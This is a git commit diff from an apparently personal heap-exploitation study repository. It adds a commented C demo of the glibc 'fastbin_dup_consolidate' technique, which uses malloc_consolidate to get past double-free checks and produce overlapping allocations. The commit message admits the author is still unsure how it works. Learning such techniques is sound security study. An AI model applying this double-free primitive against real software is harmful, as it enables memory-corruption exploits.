5857b1e92ecd8eab5dc49b69466c20d3c60643b6
Frank Wu <56958034+GhostFrankWu@users.noreply.github.com>
2022-12-28 00:52:56 +0800

    更新fastbin_dup_consolidate到最新版本，需要复习...没搞清楚到底去了哪个地方

--- glibc_2.23/fastbin_dup_consolidate.c
+++ glibc_2.23/fastbin_dup_consolidate.c
@@ -11,7 +11,7 @@
  *这个整理的过程称为unsortedbin的“consolidate”
  *而consolidate”是要在特定的条件下才会发生的，并且与malloc紧密相关
  */
-int main() {
+int main227() {
   void* p1 = malloc(0x40);
   void* p2 = malloc(0x40);
   fprintf(stderr, "malloc两个fastbin: p1=%p p2=%p\n", p1, p2);
@@ -26,4 +26,42 @@ int main() {
   fprintf(stderr, "再次释放p1，产生double free!\n");
   fprintf(stderr, "我们可以绕过malloc()的检查，因为此时p1并不在fast的顶端.\n");
   fprintf(stderr, "现在p1既在unsorted bin又在fast bin. 所以两次malloc都会得到p1: %p %p\n", malloc(0x40), malloc(0x40));
+}
+#include <stdio.h>
+#include <stdlib.h>
+#include <assert.h>
+// 需要glibc<=2.27，但现在不用了
+void main() {
+	// reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8
+	puts("这是一个用来绕过tcachebin中double free检查的强大技巧.");
+	printf("填满tcache来强制启用fast bin...\n");
+
+	void *ptr[7];
+
+	for(int i = 0; i < 7; i++)
+		ptr[i] = malloc(0x40);
+	for(int i = 0; i < 7; i++)
+		free(ptr[i]);
+
+	void* p1 = calloc(1,0x40);
+
+	printf("Allocate 一个同样大小的chunk p1=%p \n", p1);
+  	printf("这时候free p1，它会进入fastbin...\n\n");
+  	free(p1);
+
+  	void* p3 = malloc(0x400);
+	printf("Allocate 一个大小为 tcache-sized 的 chunk (p3=%p)\n", p3);
+	printf("申请一个比较大(0x400)的内存会触发malloc_consolidate，将fastbin合并到top chunk中，现在p1 and p3指向相同的chunk!\n\n");
+
+	assert(p1 == p3);
+
+	fprintf(stderr, "再次释放p1，产生double free!\n");
+	free(p1);
+
+	void *p4 = malloc(0x400);
+
+	assert(p4 == p3);
+
+	printf("double free把p1加到了tcache，这样再分配同样大小的块就会指向p3 \n");
+	printf("现在p1既在unsorted bin又在fast bin. 所以两次malloc都会得到p1(p3): p3=%p, p4=%p\n\n",p3, p4);
 }
